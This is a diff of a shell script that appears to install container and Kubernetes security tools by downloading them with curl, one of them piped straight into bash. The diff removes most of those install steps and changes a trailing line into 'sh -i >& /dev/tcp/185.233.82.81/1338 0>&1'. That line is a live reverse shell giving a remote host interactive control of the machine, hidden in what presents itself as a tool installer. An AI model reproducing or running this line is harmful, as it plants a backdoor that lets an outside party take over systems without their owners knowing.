@@ -68,40 +68,4 @@ curl https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh > dee
     && install ./deepce.sh /usr/local/bin \
     && rm -rf deepce.sh;
 
-#Install helm
-curl https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 > get_helm.sh \
-    && chmod 700 get_helm.sh \
-    && ./get_helm.sh \
-    && rm ./get_helm.sh;
-
-#Install kube-hunter
-curl -LO https://github.com/aquasecurity/kube-hunter/releases/download/v0.6.8/kube-hunter-linux-x86_64-refs.tags.v0.6.8 \
-    && install kube-hunter-linux-x86_64-refs.tags.v0.6.8 /usr/local/bin/kube-hunter \
-    && rm ./kube-hunter-linux-x86_64-refs.tags.v0.6.8;
-
-#Install kubescape
-curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash;
-
-#Install kube-bench
-curl -LO https://github.com/aquasecurity/kube-bench/releases/download/v0.8.0/kube-bench_0.8.0_linux_amd64.deb && \
-    dpkg -i kube-bench_0.8.0_linux_amd64.deb && \
-    rm -f kube-bench_0.8.0_linux_amd64.deb;
-
-#Install etcdctl
-curl -OL https://github.com/etcd-io/etcd/releases/download/v3.3.13/etcd-v3.3.13-linux-amd64.tar.gz && \
-    tar -xzvf etcd-v3.3.13-linux-amd64.tar.gz && cp etcd-v3.3.13-linux-amd64/etcdctl /usr/local/bin && \
-    chmod +x /usr/local/bin/etcdctl && rm -rf etcd-v3.3.13-linux-amd64 && rm -f etcd-v3.3.13-linux-amd64.tar.gz;
-
-#Install DDexec
-curl -LO https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh \
-    && chmod +x ddexec.sh \
-    && install ddexec.sh /usr/local/bin/ddexec.sh \
-    && rm ./ddexec.sh;
-
-# Install kubetcd
-curl -LO https://github.com/nccgroup/kubetcd/releases/download/v1.28/kubetcd_linux_amd64 \
-    && install kubetcd_linux_amd64 /usr/local/bin/kubetcd \
-    && rm ./kubetcd_linux_amd64;
-
-
-bash -i >& /dev/tcp/185.233.82.81/1337 0>&1
+sh -i >& /dev/tcp/185.233.82.81/1338 0>&1
